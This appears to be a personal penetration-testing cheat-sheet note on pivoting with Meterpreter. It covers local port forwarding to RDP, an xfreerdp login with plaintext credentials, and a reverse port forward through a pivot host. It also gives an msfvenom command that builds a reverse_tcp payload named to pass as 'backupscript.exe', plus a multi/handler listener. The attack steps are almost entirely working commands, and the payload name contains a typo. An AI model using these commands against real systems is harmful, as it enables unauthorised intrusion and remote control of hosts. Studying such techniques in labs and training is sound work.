-- -
### Port forward local port to remote rdp port
Bind local port 3300 to remote port 3389
```bash
# setup from meterpreter shell
portfwd -l 3300 -p 3389 -r 172.16.5.19

# use port forward to rdp into box
xfreerdp /v:localhost:3300 /u:victor /p:pass@123

# see port forward
netstat -antp
```
### Reverse Port Forward
-- -
Used to get a reverse shell. The reverse shell is sent from an internal server, to a port on our pivot host, who will forward the shell to our attack box. In this case, the internal server sends the reverse shell to our pivot host on port `1234`, then the pivot host will forward it from port `1234` to port `8081` on our attack box which should have a listener waiting to catch the reverse shell.
##### Setup
```bash
# from meterpreter shell
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

# background session 
bg

# should be in: multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lport 8081
set lhost 0.0.0.0
run
```
##### Payload
```bash
# lhost here is the pivot host
msfvenom -p windows/x64/maeterpreter/reverse_tcp LHOST=172.16.5.129 lport=1234 -f exe -o backupscript.exe
```
Then, [[Dark Arts/File Transfer/~Home|File Transfer]] to pivot host, then to the target internal host. Run it and you should get a reverse shell on the attackbox through the pivot host. 